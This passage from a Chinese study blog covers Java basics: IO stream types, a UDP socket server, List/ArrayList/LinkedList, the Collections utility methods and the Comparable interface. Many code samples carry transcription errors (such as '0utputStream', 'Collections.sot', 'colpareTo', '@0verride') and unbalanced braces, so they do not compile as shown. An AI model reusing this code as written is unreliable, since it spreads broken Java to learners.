<p>​    容器是组件，但组件不一定是容器</p>
<p>常见的布局管理器:</p>
<p>BorderLayout – Frame</p>
<p>FlowLayout– Panel</p>
<p>GridLayout</p>
<p>事件模型:</p>
<p>​    必须要明白哪些操作是编译器自动完成的，哪些操作是程序员手动处理的</p>
<p>​    程序员只需要做两件事:</p>
<p>​        告诉事件源可以产生哪些事件</p>
<p>​        设计好可以处理这些事件的事件监听器</p>
<p>内部类:</p>
<p>​    在一个类内部定义的类叫内部类</p>
<p>​    内部类的方法可以访问外部类的所有成员</p>
<p>​    外部类的方法不可以直接访问内部类的任何成员</p>
<p>​    一定要明白<strong>产生内部类的原因</strong></p>
<p>​                如果一个类A要使用B类的所有成员，并且A类不需要被除B以外的其他类访问，则我们可以把A定义成B的内部类</p>
<p>​                因此几乎不存在直接生成内部类对象的问题</p>
<p>​                因此几乎不存在外部类需要访同内部类成员的问题</p>
<p>匿名类:</p>
<p>​    匿名类是内部类的一种极端表现形式</p>
<p>​    匿名类可以访向外部类的所有成员和包裹本匿名类方法中的final类型的局部变量</p>
<h2 id="5-IO"><a href="#5-IO" class="headerlink" title="5.IO"></a>5.IO</h2><p>定义:</p>
<p>​    如果一个类是用来完成程序和设备之间的数据传输，则这个类有一个特殊的称谓叫流</p>
<p>流和类的关系</p>
<p>​    流一定是类，但类不一定是流</p>
<p>分类: </p>
<p>​    输入流 输出流 </p>
<p>​    字节流 字符流</p>
<p>​    原始流 包裹流</p>
<p>常用流介绍</p>
<p><strong>四大基本抽象流</strong></p>
<p>​    InputStream     0utputStream</p>
<p>​    Reader               Writer</p>
<p>字节流和字符流的区别</p>
<p>​    字节流可以处理所有格式的文件</p>
<p>​    字符流只能处理文本格式的文件</p>
<h3 id="文件流"><a href="#文件流" class="headerlink" title="文件流"></a>文件流</h3><p>FileInputStream            File0utputStream</p>
<p>FileReader                      Filewriter</p>
<h3 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h3><p>BufferedlnputStream        Buffered0utputStream</p>
<p>BufferedReader                    Bufferedriter</p>
<p>缓冲流可以提高数据传输的速度</p>
<h3 id="转化流"><a href="#转化流" class="headerlink" title="转化流"></a>转化流</h3><p>OutputStreamWriter        lnputStreamReader</p>
<p>例子:</p>
<p>​    如何将键盘上的字符组成字符串字节赋给String对象</p>
<p>​    编程卖现把用户从键盘输入的字符保荐到一个string对象中</p>
<h3 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h3><p>DatalnputStream        Data0utputStream</p>
<p>数据流可以吧基本类型数据的二进制直接读入或写出</p>
<p>例子:</p>
<p>​    编程实现将long类型数据写入byte数组</p>
<p>​    然后再byte数组中把该数据读出</p>
<h3 id="Print流（不会抛出异常）"><a href="#Print流（不会抛出异常）" class="headerlink" title="Print流（不会抛出异常）"></a>Print流（不会抛出异常）</h3><p>PrintStream        PrintWriter</p>
<p>Print流可以把基本类型数据格式化后的字符串输出</p>
<p>例子:</p>
<p>​    编程实现把键盘输入的数据写入A文件，如果输入有误则把出错信息写入B文件</p>
<h3 id="object流"><a href="#object流" class="headerlink" title="object流"></a>object流</h3><p>0bjectInputStream        0bjectOutputStream</p>
<p>Object流可以把一个对象直接写入或读出</p>
<h2 id="5容器"><a href="#5容器" class="headerlink" title="5容器:"></a>5容器:</h2><p>定义:</p>
<p>​    如果一个类是专门用来存放其他类对象的，则这个类有另外一个特殊的词叫做容器</p>
<p>容器和类的关系:</p>
<p>​    容器一定是类,但类不一定容器</p>
<h3 id="Collection接口"><a href="#Collection接口" class="headerlink" title="Collection接口"></a>Collection接口</h3><h4 id="Set接口"><a href="#Set接口" class="headerlink" title="Set接口"></a>Set接口</h4><p>​    无序，不允许重复</p>
<p>实现类:</p>
<p>​    TreeSet    HashSet</p>
<h4 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h4><p>​        有序，允许重复</p>
<p>​    实现类:</p>
<p>​        ArrayList   LinkedList</p>
<h4 id="Map接口"><a href="#Map接口" class="headerlink" title="Map接口"></a>Map接口</h4><p>定义:</p>
<p>​    既保存数据本身,也保存数据的主键的一种接口</p>
<p>实现类:</p>
<p>​    HahsMap  TreeMap</p>
<p>hashCode() 和 equals()方法（参见文章）</p>
<h3 id="Collections类"><a href="#Collections类" class="headerlink" title="Collections类"></a>Collections类</h3><p>​    该类提供了对Collection接口实现类的排序，倒置、查找等功能</p>
<h3 id="Comparable接口"><a href="#Comparable接口" class="headerlink" title="Comparable接口"></a>Comparable接口</h3><p>​    通过该接口的方法可以制订出对象之间比较的标准</p>
<p>​    凡是需要进行对象的比较排序的场合均可以考虑实现该接口</p>
<h3 id="ltefator接口"><a href="#ltefator接口" class="headerlink" title="ltefator接口"></a>ltefator接口</h3><p>​    利用该接口提供的方法我们可以遍历所有容器中的元素</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Java-11网络编程"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/04/21/Java-11%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"
    >Java 11网络编程</a> 
</h2>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/04/21/Java-11%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" class="article-date">
  <time datetime="2021-04-21T11:29:42.000Z" itemprop="datePublished">2021-04-21</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Java/">Java</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="网络程序概念-没搞懂再说吧"><a href="#网络程序概念-没搞懂再说吧" class="headerlink" title="网络程序概念(没搞懂再说吧)"></a>网络程序概念(没搞懂再说吧)</h1><ul>
<li>网络程序<ul>
<li>能够<strong>接受另一台计算机发送过来的数据</strong>或者能够<strong>向另一台计算机发送数据</strong>的程序叫做网络程序（一个程序给另一个程序发数据）</li>
</ul>
</li>
</ul>
<p>一个网络程序对应一个端口号，这个词叫做绑定</p>
<ul>
<li>套接字(socket)的引入<ul>
<li>为了能够方便的开发网络应用软件。由美国伯克利人学在Unix上推出了一种应用序访问通信协议的攥作系统调用socket(套接字)socket的出现,使留序可阀方便地访间TCP/IP,从而开发各种阴络应用的程序</li>
<li>随着Unix的应用抽广,套接字在编写网络软件中得到了极大的普及。后来，套接字又被进了Windows等操作系统中Java语言也期入了套接字编模型.</li>
</ul>
</li>
</ul>
<h2 id="基于UDP的socket编程步骤"><a href="#基于UDP的socket编程步骤" class="headerlink" title="基于UDP的socket编程步骤"></a>基于UDP的socket编程步骤</h2><ul>
<li><p>1.定义码头</p>
<ul>
<li>即：<strong>定义一个DatagramSocket对象ds</strong></li>
</ul>
</li>
<li><p>2.定义可以用来接受或发送数据的集装箱</p>
<ul>
<li><strong>定义DatagramPacket对象dp</strong></li>
</ul>
</li>
<li><p>3.在码头上用集装箱接受对方发送过来的数据**(ds.receive(dp);)**</p>
<p>​    或者在码头上把集装箱中的数据发送给对方**(ds.send(dp))**</p>
</li>
<li><p>4.关闭码头**(ds.close())**</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestUDPServer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//定义码头</span></span><br><span class="line">        DatagramSocket ds = <span class="keyword">new</span> DatagramSocket(<span class="number">5678</span>);<span class="comment">//5678表示该码头占用的是567B这个编号，因为一台计算机可以有多个码头接收多个数据，这些码头用不同的编号来表示，一台计算机可以有多个码头接收多个数据，这些码头用不同的编号来表示，</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//定义可以用来接受数据的集装箱</span></span><br><span class="line">        <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        DatagramPacket dp = <span class="keyword">new</span> DatagramPacket(buf, buf.length);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//在码头上用集装箱接受对方发送过来的数据</span></span><br><span class="line">              	ds.receive(dp); <span class="comment">//注意:本语句执行完毕就意味着，dp数据</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment">//从集装箱中取出对方发送过来的数据</span></span><br><span class="line">				ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream() 						DataInputStream dis = <span class="keyword">new</span> DatalnputStream(bais);</span><br><span class="line">				System.out.println(dis.readLong());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">            ds.close(); <span class="comment">//关闭码头</span></span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Java-10容器"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/"
    >Java 10容器</a> 
</h2>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/" class="article-date">
  <time datetime="2021-04-20T13:45:30.000Z" itemprop="datePublished">2021-04-20</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Java/">Java</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="什么是容器"><a href="#什么是容器" class="headerlink" title="什么是容器"></a>什么是容器</h1><p><strong>有一种类专门用于存放其他类对象，这个类叫集合或者容器</strong></p>
<h1 id="为什么需要容器"><a href="#为什么需要容器" class="headerlink" title="为什么需要容器"></a>为什么需要容器</h1><ul>
<li><p>数组存在两个缺陷</p>
<ul>
<li>数组长度难以扩充</li>
<li>数组中元素类型必须相同</li>
</ul>
</li>
<li><p>容器可以弥补数组的这两个缺陷</p>
</li>
</ul>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A[] arr = <span class="keyword">new</span> A[<span class="number">10</span>];</span><br></pre></td></tr></table></figure>
<p>​    表示分配了一个数组，数组的每个元素都是A类对象的一个引用，但是如果想扩充数组的长度，比如希望数组的长度变成15，我们是不能直接在原数组内存的后面追加内存的，必须得另外分配长度为15的内存空间，然后利用System.arraycopy()方法来把原数组的内容拷贝到新内存中，很明显，这即耗时。又耗内存!</p>
<p>​    所以<strong>一旦数组内存己分配，你想改变数组的长度，效率就会变的很低</strong></p>
<h1 id="容器与现实的对应关系"><a href="#容器与现实的对应关系" class="headerlink" title="容器与现实的对应关系"></a>容器与现实的对应关系</h1><ul>
<li>集合就是将若干用途、性质相同或相近的“数据”组合而成一个整体。</li>
<li>数学上，集合类型可以归纳为三种:</li>
<li>集( Set)<ul>
<li><strong>Set集合中不区分元素的顺序，不允许出现重复元素</strong></li>
</ul>
</li>
<li>列表(List)<ul>
<li>注意List不表示链表的意思，而是表示线性结构</li>
<li><strong>List集合区分元素的顺序，且允许包含重复元素</strong></li>
</ul>
</li>
<li>映射(Map)<ul>
<li><strong>映射中保存成对的“键-值”(Key-Value〉信息，映射中不能包含重复的键，每个键最多只能映射一个值</strong></li>
</ul>
</li>
<li>Java设计了三个接口来对应数学上的三种集合类型，这三个接口名字分别是Set List Map</li>
</ul>
<h1 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h1><ul>
<li>List接口是<strong>Collection的子接口</strong>，实现List接口的容器类中的元素是有顺序的，而且可以重复。</li>
<li>List容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素。</li>
<li>J2SDK所提供的List容器类有ArrayList，LinkedList等。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">object <span class="title">get</span> <span class="params">(<span class="keyword">int</span> index)</span></span>;</span><br><span class="line"><span class="function">object <span class="title">set</span> <span class="params">(<span class="keyword">int</span> index,object element)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, object element)</span></span>;</span><br><span class="line"><span class="function">object <span class="title">remove</span> <span class="params">(<span class="keyword">int</span> index)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">indexof</span><span class="params">(object o)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lastIndexof</span><span class="params">(Object o)</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCollection_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(Stringargs)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Collection c = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        c.add(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        c.add(<span class="number">123</span>);</span><br><span class="line">        c.add(<span class="number">66.6</span>);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">________________________________</span><br><span class="line">    输出结果是:</span><br><span class="line">	[zhangsan,<span class="number">123</span>,<span class="number">66.6</span>]</span><br></pre></td></tr></table></figure>

<p><strong>自己定义的类，要放进容器里，必须把toString重写</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCollection</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	Collection c = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        c.add(<span class="keyword">new</span> Student (<span class="string">&quot; zhangsan&quot;</span>, <span class="number">80</span>));</span><br><span class="line">        c.add(<span class="number">66.6</span>);</span><br><span class="line">    	System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name,<span class="keyword">int</span> age)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="keyword">this</span>.name = name;</span><br><span class="line">    	<span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果把toString方法注释掉了，则程序输出结果会有乱码</span></span><br><span class="line">    <span class="keyword">public</span> String toString</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">return</span> name +” ”+ age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>强烈建议：所有添加到Collection容器中的对象都应该重写父类 0bject 的 toString 方法</strong></p>
<h2 id="ArrayList-与-LinkedList-的比较"><a href="#ArrayList-与-LinkedList-的比较" class="headerlink" title="ArrayList 与 LinkedList 的比较"></a>ArrayList 与 LinkedList 的比较</h2><ul>
<li>ArrayList和LinkedList都实现了List接口中的方法，但两者内部实现不同</li>
<li>ArrayList底层采用数组完成，而LinkedList则是以一般的双向链表(double-linked list)完成，其内每个对象除了数据本身外，还有两个引用，分别指向前一个元素和后一个元素。</li>
<li>如果我们经常在List的开始处增加元素，或者在List中进行插入和删除操作，我们应该使用LinkedList，否则的话，使用ArrayList将更加快速。</li>
<li><strong>ArrayList存取速度快，插入删除慢</strong></li>
<li><strong>LinkedList存取速度慢，插入删除速度快</strong></li>
</ul>
<h2 id="Collections类"><a href="#Collections类" class="headerlink" title="Collections类"></a>Collections类</h2><p>​    Collection接口的实现类，如ArrayList . LinkedList本身并没有提供排序，倒置，查找等方法，这些方法是由Collections类来实现的，该类有很多public static方法，可以直接对Collection接口的实现类进行操作</p>
<h3 id="Collections类常用算法"><a href="#Collections类常用算法" class="headerlink" title="Collections类常用算法"></a>Collections类常用算法</h3><p>类java.util.collections提供了一些静态方法实现了基于List容器的一些常用算法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(List)</span>    对List容器内的元素排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shuffle</span><span class="params">(List)</span> 对List容器内的对象进行随机排列</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(List)</span> 对List容器内的对象进行逆续排列</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fill</span><span class="params">(List, object)</span></span></span><br><span class="line"><span class="function">  用一个特定的对象重写整个List容器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy</span><span class="params">(List dest,List src)</span></span></span><br><span class="line"><span class="function">  将src List容器内容拷贝到dest List容器</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binarysearch</span><span class="params">(List, object)</span></span></span><br><span class="line"><span class="function">  对于顺序的List容器，采用折半查找的方法查找特定对象</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCollections</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        List lt = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span> ;++i)</span><br><span class="line">        &#123;</span><br><span class="line">        	lt.add(<span class="string">&quot;a&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println (lt);</span><br><span class="line">        Collectigns.shuffle(lt);</span><br><span class="line">            <span class="comment">//记住LinkedList中是没有shuffle方法的，因此丢要通过Collections类的相关方法来实现</span></span><br><span class="line">        System.out.println(lt);</span><br><span class="line">        Collections.sot(lt);</span><br><span class="line">        	<span class="comment">//默认升序排序，要降序很简单，先调用Collections.sort();再调用Collections.reverse()</span></span><br><span class="line">        </span><br><span class="line">        System.out.printlIn(lt);</span><br><span class="line">        Collections.reverse(lt); <span class="comment">//倒置</span></span><br><span class="line">        System.out.println(<span class="string">&quot;倒置之后: &quot;</span> + lt);</span><br><span class="line">        System.out.println(Collections.binarySearch(lt,<span class="string">&quot;a5&quot;</span>));</span><br><span class="line">        	<span class="comment">//因为lt默认不是升序排序的，所以调用Collections.binarySearch()方法是不会成功的      </span></span><br><span class="line">        Collections.sort(lt);</span><br><span class="line">        System.out.println(<span class="string">&quot;重新排序之后: &quot;</span> + lt);</span><br><span class="line">        System.out.println(Collections.binarySearch(lt, <span class="string">&quot;a5&quot;</span>));</span><br><span class="line">        	<span class="comment">//记住，使用binarySearch()方法的前提是该容器已升序排序</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Collections-fill-用法"><a href="#Collections-fill-用法" class="headerlink" title="Collections.fill()用法"></a>Collections.fill()用法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">List lt = <span class="keyword">new</span> LinkedList(); <span class="comment">//7行</span></span><br><span class="line">lt.add(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">lt.add(<span class="string">&quot;222&quot;</span>);</span><br><span class="line">lt.add(<span class="string">&quot;333&quot;</span>);</span><br><span class="line">System.out.printIn(lt);</span><br><span class="line">Collections.fill(lt,<span class="string">&quot;888&quot;</span>);</span><br><span class="line">System.out.println(lt);</span><br><span class="line">___________________________________</span><br><span class="line">    [<span class="number">111</span>,<span class="number">222</span>,<span class="number">333</span>]</span><br><span class="line">    [<span class="number">888</span>,<span class="number">888</span>,<span class="number">888</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.uti1.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Comparable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span> <span class="params">(<span class="keyword">int</span> id, String name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @0verride</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> id + <span class="string">&quot;&quot;</span> + name; <span class="comment">//1000张三</span></span><br><span class="line">        <span class="comment">//System.out.println();</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @0verride</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">colpareTo</span><span class="params">(0bject o)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Student st = (Student)o;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.id == st.id)</span><br><span class="line">        	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.id &gt; st.id)</span><br><span class="line">        	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        	<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        List L= <span class="keyword">new</span> ArrayList ();</span><br><span class="line">        L.add(<span class="keyword">new</span> Student(<span class="number">1000</span>,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        L.add(<span class="keyword">new</span> Student(<span class="number">1003</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        L.add(<span class="keyword">new</span> Student(<span class="number">1002</span>,<span class="string">&quot;王五&quot;</span>);</span><br><span class="line">        L.add(<span class="keyword">new</span> Student(<span class="number">1001</span>,<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Collections.sort(L);</span><br><span class="line">              </span><br><span class="line">        System.out.println(L);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Comparable接口"><a href="#Comparable接口" class="headerlink" title="Comparable接口"></a>Comparable接口</h2><h4 id="为何要使用Comparable接口"><a href="#为何要使用Comparable接口" class="headerlink" title="为何要使用Comparable接口"></a>为何要使用Comparable接口</h4><ul>
<li>基本类型数据和String类型数据，它们彼此的比较标准Java语言本身已经提供好了</li>
<li>用户自定义类对象之间比较的标准Java语言本身是没有提供的</li>
<li>所以<strong>如果一个容器中含有用户自定义类型的数据，并且我们需要对容器中元素进行排序，或查找某一元素时，我们就必须得制定容器中元素与元素之间比较的标准</strong></li>
<li>凡是需要进行对象比较/排序的场合均可考虑实现Comparable接口</li>
</ul>
